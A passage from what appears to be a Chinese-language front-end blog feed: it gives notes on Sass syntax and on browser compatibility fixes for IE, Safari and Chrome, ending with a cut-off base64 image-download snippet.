class="line">    // var str = window.location.href.substr(-1,1);      //获取url中携带的参数值h=5</span><br><span class="line">    // 因为已经是b域名下的页面了，可以通过请求各种b域名下的数据再设置window.name的值</span><br><span class="line">    window.name = &apos;some data&apos;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.xiaolai.cc/2018/11/02/js%E8%B7%A8%E5%9F%9F/" target="_blank" rel="noopener">js跨域</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Sass常用命令</title>
      <link href="/2018/11/06/Sass%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/11/06/Sass%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>Sass是一款强化CSS的辅助功能，它在CSS语法上增加了变量，嵌套，混合，导入等功能。 你还可以通过函数进行颜色值与属性值得运算，使用控制指令(control directives)等高级功能。<br><br></p><h3 id="1-编译sass"><a href="#1-编译sass" class="headerlink" title="1. 编译sass"></a>1. 编译sass</h3><p>–watch 监听<br>–style 解析后的css是什么排版格式 nested / expanded / compact / compressed(压缩)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sass input.scss output.scss</span><br><span class="line">sass --watch input.scss:output.scss</span><br><span class="line">sass --watch app/sass:public/stylesheets</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-导入sass"><a href="#2-导入sass" class="headerlink" title="2. 导入sass"></a>2. 导入sass</h3><ul><li>导入局部文件<br>@import 规则规则不需要指明被导入文件的全名，可以省略 .sass 或 .scss 文件后缀。<br>如果需要导入sass文件，但又不希望将其编译为CSS，只需在文件名前添加下划线，这样会告诉sass不要编译这些文件。导入语句中不需要添加下划线。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;colors&quot;</span><br></pre></td></tr></table></figure></li></ul><p>导入的其实是 _colors.scss</p><ul><li>CSS规则内导入<br>@import 文件导入到一个CSS规则内<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// _blue-theme.scss</span><br><span class="line">aside&#123; background: blue &#125;</span><br><span class="line"></span><br><span class="line">// main.scss</span><br><span class="line">.container&#123; @import &quot;blue-theme&quot; &#125;</span><br><span class="line">.contaienr&#123;</span><br><span class="line">  aside&#123; background: blue &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3. 变量"></a>3. 变量</h3><ul><li><p><em>$</em><br>定义变量，变量支持块级作用域，嵌套规则内定义的变量只能在嵌套规则内使用(局部变量)。将局部变量转换为全局变量可添加<code>!global</code>声明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$blue: #4788C7;</span><br><span class="line">$border: 1px solid $blue;</span><br><span class="line">.nav&#123;</span><br><span class="line">  border: $border;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>&amp;</em><br>表示父选择器，常用于添加伪类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article a &#123;</span><br><span class="line">  &amp;:hover &#123; color: red &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟随后缀生成复合的选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#main &#123; &amp;-sidebar&#123; color: red &#125;&#125;</span><br><span class="line">#main-sidebar&#123; color: red &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>@minxin, @include</em><br>混合器，实现大段样式的重用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@mixin rounded-corners&#123; border-radius: 5px &#125;</span><br><span class="line">notice&#123; @include rounded-corners &#125;</span><br></pre></td></tr></table></figure><p>混合器传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@mixin link-colors($normal, $hover)&#123;</span><br><span class="line">  color: $normal;</span><br><span class="line">  &amp;:hover&#123; color: $hover &#125;;</span><br><span class="line">&#125;</span><br><span class="line">a&#123; @inclue link-color($normal: blue, $hover: red) &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>%</em><br>占位符选择器，必须使用@extend指令调用。</p></li><li><p><em>@extend</em><br>在设计网页时常常会遇到这样的情况：一个元素使用的样式与另一个元素完全相同，但又添加了额外的样式。我们通常会在HTML中给元素定义两个class，一个通用样式，一个特殊样式。如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;error seriousError&quot;&gt;Oh! Crash&lt;div&gt;</span><br></pre></td></tr></table></figure><p>使用<code>@extend</code>将一个选择器下的所有样式继承给另一个选择器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.error&#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">.serioutsErro&#123;</span><br><span class="line">  @extend .error;</span><br><span class="line">  border-width: 3px;</span><br><span class="line">&#125;</span><br><span class="line">.hoverlink&#123;</span><br><span class="line">  @extend a:hover</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-其它语法"><a href="#4-其它语法" class="headerlink" title="4. 其它语法"></a>4. 其它语法</h3><ul><li><p><em>!default</em><br>默认变量值，如果这个变量被声明赋值了，那就用声明的值，否则用这个默认值。(很像!important的对立面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blue: #4788C7 !default;</span><br></pre></td></tr></table></figure></li><li><p><em>.classA{ @extend .classB }</em><br>使用选择器继承来精简CSS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.error&#123; background: red &#125;</span><br><span class="line">.seriousError&#123; @extend .error &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>属性嵌套</em><br>为了便于管理有相同命名空间的属性，sass允许将属性嵌套在命名空间中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">  font: &#123;</span><br><span class="line">    size: 14px;</span><br><span class="line">    weight: normal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-SassScript"><a href="#5-SassScript" class="headerlink" title="5. SassScript"></a>5. SassScript</h3><h4 id="5-1-Interactive-Shell"><a href="#5-1-Interactive-Shell" class="headerlink" title="5.1 Interactive Shell"></a>5.1 Interactive Shell</h4><p>SassScript可作用于任何属性，允许属性使用变量、算数运算等额外功能。在命令行中输入<code>sass -i</code>，可以输入想要测试的SassScript查看输出结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sass -i</span><br><span class="line">&gt;&gt; 1px + 1px</span><br><span class="line">2px</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-变量与运算"><a href="#5-2-变量与运算" class="headerlink" title="5.2 变量与运算"></a>5.2 变量与运算</h4><ul><li><p><strong>支持的数据类型</strong><br>数字(10,10px)，字符串，颜色(blue, #fff)，布尔值(true, false)，控制(null)，数组(10px 20px, Arial, sans-serif)，maps(key1: value1, key2: value2)</p></li><li><p><strong>插值语句</strong><br>用<em><code>#{}</code></em>插值语句将变量包裹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$name: foo;</span><br><span class="line">p.#&#123;name&#125;&#123;</span><br><span class="line">  color:blue;</span><br><span class="line">&#125;</span><br><span class="line">font-size: $&#123;$font-size&#125;/$&#123;$line-height&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>运算</strong><br><code>width: 10px/8px</code></p></li><li><p><strong>颜色值运算</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#010203 + #040506 = #050709</span><br><span class="line">#010203 * 2 = #020406</span><br><span class="line"></span><br><span class="line">// 必须拥有相同的alpha值才能运算，算术运算不会作用于alpha值</span><br><span class="line">rgba(255,0,0,0.75) + rgba(0,255,0,0.75) = rgba(255,255,0,0.75) </span><br><span class="line"></span><br><span class="line">// alpha值可以通过opacity或transparentize两个函数进行调整</span><br><span class="line">$red: rgba(255,0,0,0.5)</span><br><span class="line">opacity($red, 0.3)           = rgba(255,0,0,0.5)</span><br><span class="line">transparentize($red, 0.25)   = rgba(255,0,0,0.25)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-3-media"><a href="#5-3-media" class="headerlink" title="5.3 @media"></a>5.3 @media</h4><p>@media可以使用SassScript代替条件的名称或值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$media: screen;</span><br><span class="line">$feature: max-width;</span><br><span class="line">$value: 576px;</span><br><span class="line">@media #&#123;$media&#125; and ($feature: $value)&#123;</span><br><span class="line">  .sidebar&#123; width: 500px &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-if"><a href="#5-4-if" class="headerlink" title="5.4 @if"></a>5.4 @if</h4><p>当@if的表达式返回值不是false或null时，条件成立，输出{}内的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$type: monster;</span><br><span class="line">p&#123;</span><br><span class="line">  @if type == ocean&#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125; @else if $type == monster&#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125; @else&#123;</span><br><span class="line">    color: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-5-for-each"><a href="#5-5-for-each" class="headerlink" title="5.5 @for, @each"></a>5.5 @for, @each</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@for $i from 1 through 3&#123;</span><br><span class="line">  .item-#&#123;$i&#125;&#123;</span><br><span class="line">    width: 2em * $i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@each $animal in puma, sea-slug, egret, salamander&#123;</span><br><span class="line">  .#&#123;$animal&#125;-icon&#123;</span><br><span class="line">    background: url(&apos;/images/#&#123;$animal&#125;.png&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@each $animal, $color, $cursor in (puma, black, default),</span><br><span class="line">                                  (sea-slug, blue, pointer),</span><br><span class="line">                                  (egret, white, move) &#123;</span><br><span class="line">  .#&#123;$animal&#125;-icon &#123;</span><br><span class="line">    background-image: url(&apos;/images/#&#123;$animal&#125;.png&apos;);</span><br><span class="line">    border: 2px solid $color;</span><br><span class="line">    cursor: $cursor;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-6-while"><a href="#5-6-while" class="headerlink" title="5.6 @while"></a>5.6 @while</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$i: 6;</span><br><span class="line">@while $i&gt;0&#123;</span><br><span class="line">  .item-#&#123;$i&#125;&#123; width: 2em * $i&#125;</span><br><span class="line">  $i: $i -2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-7-function"><a href="#5-7-function" class="headerlink" title="5.7 @function"></a>5.7 @function</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$grid-width: 40px;</span><br><span class="line">$gutter-width: 10px;</span><br><span class="line"></span><br><span class="line">@function grid-width($n)&#123;</span><br><span class="line">  @return $n * $grid-width + ($n - 1) * $gutter-width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar&#123; width: grid-width(5) &#125;</span><br></pre></td></tr></table></figure><h4 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h4><h4 id="6-1-calc在less编译时被计算"><a href="#6-1-calc在less编译时被计算" class="headerlink" title="6.1 calc在less编译时被计算"></a>6.1 calc在less编译时被计算</h4><p><code>{width: calc(100% - 30px)}</code>Less会把这个当成运算式去执行，解析成<code>{width: calc(70%)}</code>。改变写法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div&#123; width: calc(~&quot;100% - 30px&quot;)&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IE兼容问题</title>
      <link href="/2018/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9/"/>
      <url>/2018/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9/</url>
      <content type="html"><![CDATA[<h4 id="1-设置IE-lt-select-gt-下拉箭头"><a href="#1-设置IE-lt-select-gt-下拉箭头" class="headerlink" title="1. 设置IE&lt;select&gt; 下拉箭头"></a>1. 设置IE<code>&lt;select&gt;</code> 下拉箭头</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select</span><span class="selector-pseudo">::-ms-expand</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">select</span> &#123;</span><br><span class="line">  <span class="attribute">appearance</span>:none;</span><br><span class="line">  <span class="attribute">-moz-appearance</span>:none;</span><br><span class="line">  <span class="attribute">-webkit-appearance</span>:none;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">"http://ourjs.github.io/static/2015/arrow.png"</span>) no-repeat scroll right center transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/2.png" style="width:250px"><br><br></p><h4 id="2-清除IE-lt-select-gt-选中后的蓝色背景"><a href="#2-清除IE-lt-select-gt-选中后的蓝色背景" class="headerlink" title="2. 清除IE&lt;select&gt;选中后的蓝色背景"></a>2. 清除IE<code>&lt;select&gt;</code>选中后的蓝色背景</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select::-ms-value&#123;</span><br><span class="line">  background: transparent;</span><br><span class="line">  color: #000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/3.png" style="width:250px"><br><br></p><h4 id="3-去除IE-lt-input-gt-清除按钮"><a href="#3-去除IE-lt-input-gt-清除按钮" class="headerlink" title="3. 去除IE&lt;input&gt;清除按钮"></a>3. 去除IE<code>&lt;input&gt;</code>清除按钮</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input::-ms-clear&#123;</span><br><span class="line">  width: 0;</span><br><span class="line">  height: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/1.png" style="width:400px"><br><br></p><h4 id="4-去除chrom浏览器记住密码"><a href="#4-去除chrom浏览器记住密码" class="headerlink" title="4. 去除chrom浏览器记住密码"></a>4. 去除chrom浏览器记住密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;username&quot; autocomplete=&quot;off&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;password&quot; autocomplete=&quot;new-password&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="5-去除-lt-a-gt-点击时的灰色背景"><a href="#5-去除-lt-a-gt-点击时的灰色背景" class="headerlink" title="5. 去除&lt;a&gt;点击时的灰色背景"></a>5. 去除<code>&lt;a&gt;</code>点击时的灰色背景</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a,a:hover,a:active,a:visited,a:link,a:focus&#123;</span><br><span class="line">  -webkit-tap-highlight-color:rgba(0,0,0,0);</span><br><span class="line">  -webkit-tap-highlight-color: transparent;</span><br><span class="line">  outline:none;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/4.png" style="width:250px"><br><br></p><h4 id="6-favicon-ico"><a href="#6-favicon-ico" class="headerlink" title="6. favicon.ico"></a>6. favicon.ico</h4><p>Chrome, firefox请求的是: link的href所对应的图标<br>搜狗浏览器, 360浏览器, qq浏览器请求的是: <code>http://host:3529/favicon.ico</code> 或 <code>http://host/favicon.ico</code> (360浏览器会忽略端口)</p><p><em>如果要让favicon.ico的兼容性更好: 最好放在根目录</em></p><ul><li>检查网站根目录下的favicon.ico, 图标是否正确</li><li>确保使用的是根目录 host/favicon.ico<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;icon&quot; href=&quot;http://host/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="7-绑定事件"><a href="#7-绑定事件" class="headerlink" title="7. 绑定事件"></a>7. 绑定事件</h4><ul><li>IE支持attachEvent, detachEvent</li><li>Chrome和firefox支持addEventListener, removeEventListener<br><br></li></ul><h4 id="8-IE-min-height在flex容器里无效"><a href="#8-IE-min-height在flex容器里无效" class="headerlink" title="8. IE min-height在flex容器里无效"></a>8. IE min-height在flex容器里无效</h4><p>上中下布局，在原有wrapper外添加<em><code>.app{ display: flex }</code></em>。<br>Chorme, Firefox, Safari, IE11, IE10有效 <a href="/2018/11/06/CSS-example/#5-flex-%E4%B8%8A%E4%B8%AD%E4%B8%8B%E5%B8%83%E5%B1%80">具体查看</a></p><p><br></p><h4 id="9-IE-不支持css属性值unset"><a href="#9-IE-不支持css属性值unset" class="headerlink" title="9. IE 不支持css属性值unset"></a>9. IE 不支持css属性值<code>unset</code></h4><p>用<code>initial</code>代替</p><p><br></p><h4 id="10-IE11-flex多列布局-无视border-box"><a href="#10-IE11-flex多列布局-无视border-box" class="headerlink" title="10. IE11 flex多列布局 无视border-box"></a>10. IE11 flex多列布局 无视<code>border-box</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">*&#123;</span></span><br><span class="line"><span class="undefined">  box-sizing: border-box;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: flex;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">flex</span>: 0 0 33<span class="selector-class">.3</span>%;</span></span><br><span class="line"><span class="undefined">  padding: 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome, firefox上会挤在一行里，每个<code>item</code>之间有20px的间距。但在IE11下，<code>flex-basis</code>设置的是具体的宽度，它会无视我们设置的<code>box-sizing: border-box;</code>，这时，最后一个元素会溢出容器，显示为两行。<em>解决方法:</em><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">*&#123;</span></span><br><span class="line"><span class="undefined">  box-sizing: border-box;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: flex;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">flex</span>: 0 0 33<span class="selector-class">.3</span>%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span> &gt; <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="undefined">  margin: 0 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="11-去除Safari-input-textarea阴影"><a href="#11-去除Safari-input-textarea阴影" class="headerlink" title="11. 去除Safari input textarea阴影"></a>11. 去除Safari input textarea阴影</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>&#123;</span><br><span class="line">  <span class="attribute">-webkit-appearance</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="12-可滚动-lt-div-gt-中padding-bottom无效"><a href="#12-可滚动-lt-div-gt-中padding-bottom无效" class="headerlink" title="12. 可滚动&lt;div&gt;中padding-bottom无效"></a>12. 可滚动<code>&lt;div&gt;</code>中padding-bottom无效</h4><p>给里面的元素添加<code>padding</code>值</p><p><br></p><h4 id="13-js实现base64图片下载"><a href="#13-js实现base64图片下载" class="headerlink" title="13. js实现base64图片下载"></a>13. js实现base64图片下载</h4><p>在IE11中，会报错“传递给系统调用的数据区域太小”。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> imgUrl = <span class="string">'data:image/png;base64,...'</span></span><br><span class="line"><span class="comment">// IE中使用msSaveOrOpenBlob方法（</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.navigator.msSaveOrOpenBlob) &#123;</span><br><span class="line">  <span class="keyword">var</span> bstr = atob(imgUrl.split(<span class="string">','</span>)[<span class="number">1</span>])</span><br><span class="line">  <span class="keyword">var</span> n = bstr.length</span><br><span class="line">  <span class="keyword">var</span> u8arr = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(n)</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    u8arr[n] = bstr.charCodeAt(n)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([u8arr])</span><br><span class="line">  <span class="built_in">window</span>.navigator.msSaveOrOpenBlob(blob, <span class="string">'chart-download'</span> + <span class="string">'.'</span> + <span class="string">'png'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 创建a标签，触发点击</span></span><br><span class="line">  <span class="keyword">const</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">  a.href = imgUrl</span><br><span class="line">  a.setAttribute(<span class="string">'download'</span>, <span class="string">'chart-download'</span>)</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a)  <span class="comment">// 